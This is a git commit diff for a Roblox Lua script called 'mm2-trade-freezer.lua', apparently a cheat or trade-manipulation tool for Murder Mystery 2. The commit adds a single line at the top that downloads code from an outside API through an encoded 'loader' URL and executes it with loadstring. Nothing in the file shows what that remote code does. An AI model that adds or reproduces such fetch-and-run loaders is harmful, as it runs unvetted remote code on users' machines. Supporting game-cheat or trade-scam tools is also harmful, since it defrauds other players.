7d144260ac32ff99a40a4cee1007bb2bacdf6899
createdreallol <116285995+createdreallol@users.noreply.github.com>
2026-04-10 01:24:34 -0400

    Update mm2-trade-freezer.lua

--- mm2-trade-freezer.lua
+++ mm2-trade-freezer.lua
@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM4MTM3ODUzLTFhZmEtNDFjZC1hNjQ0LTVmNWM1YjcwOWI2MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
 --[[
 triple t
 ]]--
